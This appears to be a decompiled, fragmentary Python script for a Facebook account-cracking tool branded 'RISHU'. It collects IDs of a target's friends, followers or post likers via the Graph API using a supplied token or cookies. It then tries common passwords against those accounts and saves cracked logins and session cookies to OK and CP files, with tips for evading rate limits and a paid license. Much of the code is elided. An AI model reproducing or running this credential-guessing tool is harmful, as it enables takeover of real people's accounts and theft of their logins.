...
# Time Succes decompile : 2021-10-11 14:53:27.211488
...
def menu_log():
    ...
    banner()
    var_menu()
    pmu = input(' \x1b[1;37m[\x1b[1;32m•\x1b[1;37m] choose : ')
    if pmu in ['']:
        jalan('%s[%s!%s] %sI the Right One'%(M,P,M,P))
        menu_log()
        ...
        print('\033[1;97m-------------------------------------------------')
        print('\x1b[1;32mPlease Wait Token Saving')
        try:
            ...
            jalan('%s[%s!%s] %s Connection Problem'%(M,P,M,P))
            exit()
        ...
        print('\033[1;97m-------------------------------------------------')
        print('\x1b[1;32mPlease Wait Cookies Saving')
        try:
        ...
        if pf in ['']:
            jalan('%s[%s!%s] %s Correct Content'%(M,P,M,P))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://www.facebook.com/al3x.rishu')
            print('\033[1;97m-------------------------------------------------')
            input('%s[ %s Back %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://chat.whatsapp.com/LVnlROF7UgyGKAMFG2C1vu')
            print('\033[1;97m-------------------------------------------------')
...
def menu():
    ...
    try:
        ...
        i = y['id']
         ...
         jalan('%s       [%s!%s] %sPlz Login Agen'%(M,P,M,P))
         os.system('rm -rf token.txt')
         menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %s Connection Problem'%(M,P,M,P))
    ...
    print(' \033[1;97m-------------------------------------------------')
    print(' \x1b[1;37m[\x1b[1;32m1\x1b[1;37m] Crack Friend/Public ID ')
    print(' \x1b[1;37m[\x1b[1;32m2\x1b[1;37m] Follower ID Crack  ')
    print(' \x1b[1;37m[\x1b[1;32m3\x1b[1;37m] Crack ID Likers Posts ')
    print(' \x1b[1;37m[\x1b[1;32m4\x1b[1;37m] User Agent')
    print(' \x1b[1;37m[\x1b[1;32m0\x1b[1;37m] Log Out')
    print(' \033[1;97m-------------------------------------------------')
    pm = input(' \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m] Choose : ')
    if pm in ['']:
        jalan('%s[%s!%s] %s Correct Content'%(M,P,M,P))
        menu()
        ...
        likers()
    elif pm in ['400','0004','0004','00d']:
        target()
    elif pm in ['005','005','0005','0e']:
        teman_target()
    elif pm in ['060','006','0006','f0']:
        hasil()
    elif pm in ['404','007','007','0g']:
        cek_hasil()
    elif pm in ['4','04','004','d']:
        ugen()
    elif pm in ['009','0009','00090','i0']:
        buy_license()
...
def ugen():
    ...
    if pmu in[""]:
        ...
        input('\x1b[1;37m [Return] ')
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input(" \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m]  Enter User Agent : ")
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan(" \x1b[1;32m[ Successfully Changed User Agent ]")
            print('\033[1;97m-------------------------------------------------')
            input(' \x1b[1;37m[  Return ]')
            menu()
        except (KeyError,IOError):
            jalan(" \n%s[ %s Failed to Change User Agent ]"%(M,P,M))
            input(' %s[ %s Return %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan(" \x1b[1;32m[  User Agent Deleted Successfully ]")
        print('\033[1;97m-------------------------------------------------')
        input(' \x1b[1;37m[ Return ]')
        menu()
        ...
        try:
            ...
            ungser = ' \x1b[1;31mNot found'
        print(" %s[%s•%s] %s Your User Agent  : %s%s"%(O,P,O,P,O,ungser))
        print('\033[1;97m-------------------------------------------------')
        jalan(" \n\x1b[1;32m[  This is your current user agent ]")
        print('\033[1;97m-------------------------------------------------')
        input(' \x1b[1;37m[  Return ]')
        menu()
...
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print(' \x1b[1;37m[\x1b[1;32m1\x1b[1;37m] Xiaomi')
    print(' \x1b[1;37m[\x1b[1;32m2\x1b[1;37m] Nokia')
    print(' \x1b[1;37m[\x1b[1;32m3\x1b[1;37m] Asus')
    print(' \x1b[1;37m[\x1b[1;32m4\x1b[1;37m] Huawei')
    print(' \x1b[1;37m[\x1b[1;32m5\x1b[1;37m] Vivo')
    print(' \x1b[1;37m[\x1b[1;32m6\x1b[1;37m] Oppo')
    print(' \x1b[1;37m[\x1b[1;32m7\x1b[1;37m] Samsung')
    print(' \x1b[1;37m[\x1b[1;32m8\x1b[1;37m] Windows')
    print('\033[1;97m-------------------------------------------------')
    pc = input('\x1b[1;37m[\x1b[1;32m•\x1b[1;37m]  choose : ')
    if pc in['']:jalan('%s[%s!%s] %s Correct Content'%(M,P,M,P));menu()
    elif pc in ['1','01']:
    ...
    else:jalan('%s[%s!%s] %s Correct Content'%(M,P,M,P));menu()
    jalan(" \x1b[1;32m[ Successfully Changed User Agent ]")
    input(' \x1b[1;37m[ Return ]')
    menu()
def publik():
    ...
    banner()
    try:
        print('\x1b[1;37mWrite \'me\' To Retrieve Friend ID')
        print('\033[1;97m-------------------------------------------------')
        it = input(" \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m] ID Target : \x1b[1;32m")
        try:
...
def pengikut():
    ...
    try:
        ...
        banner()
        print('\033[1;97m-------------------------------------------------')
        it = input("ID Target : \x1b[1;32m")
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            jalan('%s[%s!%s] %s ID Not Found'%(M,P,M,P))
            menu()
...
def generate4(_cici_):
    ...
    return _dapunta_
def tambah_pass():
    print(' Contoh : sayang,bismillah,123456,786786')
    cuy = input(' Enter Manual Additional Pass [1 Say] : ')
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
...
class crack:
    def __init__(self,files):
        ...
        print('\033[1;97m-------------------------------------------------')
        while True:
            f = input(' \x1b[1;37m[\x1b[1;32m*\x1b[1;37m]  Choose : ')
            print('\033[1;97m-------------------------------------------------')
            clear()
            banner()
            if f=="":
                ...
                try:
                    ...
                    print(("   %s"%e))
                    continue
                print(' \x1b[1;37m Example : 786786,223344,123456')
                print('\033[1;97m-------------------------------------------------')
                self.pwlist()
                break
                ...
                try:
                    ...
                    self.fl = []
                    start_methodezz()
                    kopi = input(' \x1b[1;37m[\x1b[1;32m*\x1b[1;37m] choose : ')
                    clear()
                    banner()
                    if kopi in ['']:
                        jalan('%s[%s!%s] %s Correct Content'%(M,P,M,P))
                        ...
                        menu()
                    start_method()
                    put = input(' \x1b[1;37m[\x1b[1;32m•\x1b[1;37m] Choose : ')
                    print('\033[1;97m-------------------------------------------------')
                    if put in ['']:                    	
                        jalan(' %s[%s!%s] %s Correct Content'%(M,P,M,P))
                        menu()
                    elif put in ['1','01','001','a']:
                        print(' [\x1b[1;32m1\x1b[1;37m] Start Cracking  Process')
                        print('\033[1;97m-------------------------------------------------')
                        puf = input('\x1b[1;37m[\x1b[1;32m•\x1b[1;37m] Choose : ')
                        clear()
                        banner()
                        if puf in ['']:
                            jalan('%s[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                        elif puf in ['2','02','001','y','Y']:
                            cek_license()
                            started()
                            ...
                            jalan('%s[%s!%s] %s Correct Contentr'%(M,P,M,P))
                            menu()
                    ...
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input(' \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m]  Enter Password : \x1b[1;32m').split(",")
        print('\033[1;97m-------------------------------------------------')
        clear()
        banner()
        if len(self.pw) ==0:
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    print("\r%s[%sRISHU-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sRISHU-OK%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
        ...
        try:
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    h_ok = "\r%s[%sRISHUOK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        h_cp = "\r%s[%sRISHU-CP%s] %s • %s • %s %s %s%s"%(O,P,O,fl.get("id"),i,d,m,y,tahun(fl.get("id")))
                    ...
                    h_cp = "\r%s[%sRISHU-CP%s] %s • %s%s     "%(O,P,O,fl.get("id"),i,tahun(fl.get("id")))
                    cek_log(fl.get("id"),i,h_cp)
                    print("")
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    ...
                    h_ok = "\r%s[%sRISHU-OK%s] %s • %s%s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P)
                    cek_apk(h_ok,koki(log.get("cookies")))
                    print("")
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
...
def target():
    ...
    idt = input("\x1b[1;37m[\x1b[1;32m✓\x1b[1;37m] ID Target : ")
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
    except (KeyError,IOError):jalan('%s[%s!%s] %s ID Not Found'%(M,P,M,P));menu()
    try:nm = zy["name"]
...
def cek_license():
    try:
        ...
        exit()
def var_menu():
    print('%s             [ %sChoose Login Method %s]'%(O,P,O))
    print('\033[1;97m-------------------------------------------------')
    print('%s[%s1%s] %s Login With Token'%(O,P,O,P))
    print('%s[%s2%s] %s Login With Cookies'%(O,P,O,P))
    print('%s[%s3%s] %s Contact To Owner'%(O,P,O,P))
    print('%s[%s0%s] %s Go out'%(O,P,O,P))
    print('\033[1;97m-------------------------------------------------')
def var_tutor():
    print('\033[1;97m-------------------------------------------------')
    print('%s [%s1%s] %sContact To Owner [RISHU]'%(O,P,O,P))
    print('%s [%s2%s] %sJoin Whatsapp Group'%(O,P,O,P))
    print('\033[1;97m-------------------------------------------------')
def tutor_target():
    mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
...
def tutor_crack():
    ...
    print('%s║'%(O))
def var_ugen():
    print(" \x1b[1;37m[\x1b[1;32m1\x1b[1;37m] Get User Agent")
    print(" \x1b[1;37m[\x1b[1;32m2\x1b[1;37m] Change User Agent (\x1b[1;32mManual\x1b[1;37m)")
    print(" \x1b[1;37m[\x1b[1;32m3\x1b[1;37m] Change User Agent (\x1b[1;32mAdjust HP\x1b[1;37m)")
    print(" \x1b[1;37m[\x1b[1;32m4\x1b[1;37m] Delete User Agent")
    print(" \x1b[1;37m[\x1b[1;32m5\x1b[1;37m] Check User Agent")
    print(" \x1b[1;37m[\x1b[1;32m5\x1b[1;37m] Return")
    print('\033[1;97m-------------------------------------------------')
def start_method():
    print(' \x1b[1;37m[\x1b[1;32m1\x1b[1;37m] Metode Api')
    print(' \x1b[1;37m[\x1b[1;32m2\x1b[1;37m] Metode Mbasic')
    print(' \x1b[1;37m[\x1b[1;32m3\x1b[1;37m] Metode Free FB')
    print('\033[1;97m-------------------------------------------------')
def start_methodezz():
    print(' \x1b[1;37m[\x1b[1;32m1\x1b[1;37m] 6 Pass [\x1b[1;32mFast Crack\x1b[1;37m]')
    print(' \x1b[1;37m[\x1b[1;32m2\x1b[1;37m] 9 Pass [\x1b[1;32mSlow Crack\x1b[1;37m]')
    print(' \x1b[1;37m[\x1b[1;32m3\x1b[1;37m] 12 Pass [\x1b[1;32mSlow Crack\x1b[1;37m]')
    print(' \x1b[1;37m[\x1b[1;32m4\x1b[1;37m] Combined Password Crack')
    print('\033[1;97m-------------------------------------------------')
def started():
    print(' \x1b[1;37m[\x1b[1;32m✓\x1b[1;37m]  Cracks In Progress...')
    print(' \x1b[1;32m Airplane Mode [5 Seconds Only] Every 5 Minutes')
    print('\033[1;97m-------------------------------------------------')
def folder():
    try:os.mkdir("CP")
    except:pass
